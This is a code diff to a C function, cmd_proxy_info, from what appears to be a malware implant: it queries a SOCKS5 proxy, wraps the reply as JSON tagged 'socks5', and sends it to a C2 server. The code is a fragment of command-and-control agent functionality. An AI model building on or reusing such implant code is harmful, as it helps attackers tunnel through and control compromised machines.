@@ -12,20 +12,21 @@
 command_result* cmd_proxy_info(session* sess, packet* pck)
 {
 	message* msg = ZERO(message);
-
-	// first stop using the proxy
-	DECLARE_RESULT(error);
+	cJSON* jpck = ZERO(cJSON);
+	cJSON* jport = ZERO(cJSON);
+	cJSON* jresponse = ZERO(cJSON);
+	char* response_string = ZERO(char);
 	socks5_command cmd = { .type = INFO };
+	DECLARE_RESULT(error);
 
-	// obtain proxy details
-	cJSON* jpck = convert_to_JSON(pck);
+	jpck = convert_to_JSON(pck);
 	if (!jpck) {
 		error->error_code = ERROR_JSON_CONVERSION;
 		goto fail;
 	}
 
 	// extract proxy info
-	cJSON* jport = cJSON_GetObjectItem(jpck, "port");
+	jport = cJSON_GetObjectItem(jpck, "port");
 	if (!jport) {
 		error->error_code = ERROR_MISSING_DATA;
 		error->data = (void*)"port";
@@ -34,13 +35,26 @@ command_result* cmd_proxy_info(session* sess, packet* pck)
 
 	if (!proxy_send_command(&cmd, jport->valuestring)) goto fail;
 
-	// the received data is already in JSON format, send it to the C2 server	
+	// the received data is in JSON format
+	jresponse = cJSON_Parse(cmd.response);
+	if (!jresponse) goto fail;
+
+	// add type
+	cJSON* jtype = cJSON_CreateString("socks5");
+	if (!jtype) goto fail;
+	cJSON_AddItemToObject(jresponse, "type", jtype);
+
+	// create string result		
+	response_string = cJSON_Print(jresponse);
+	if (!response_string) goto fail;
+
+	// send it to the C2 server	
 	msg = message_create(sess);
 	if (!msg) goto fail;
 	if (!message_add_request_data(
 		msg,
-		cmd.response_size,
-		cmd.response,
+		strlen(response_string),
+		response_string,
 		pck->id,
 		0,
 		REQUEST_COMMANDDATA,
@@ -53,8 +67,10 @@ command_result* cmd_proxy_info(session* sess, packet* pck)
 
 fail:
 	if (jpck) cJSON_Delete(jpck);
+	if (jresponse) cJSON_Delete(jresponse);
 	FREE(msg);
 	FREE(cmd.response);
+	FREE(response_string);
 	return error;
 }
 
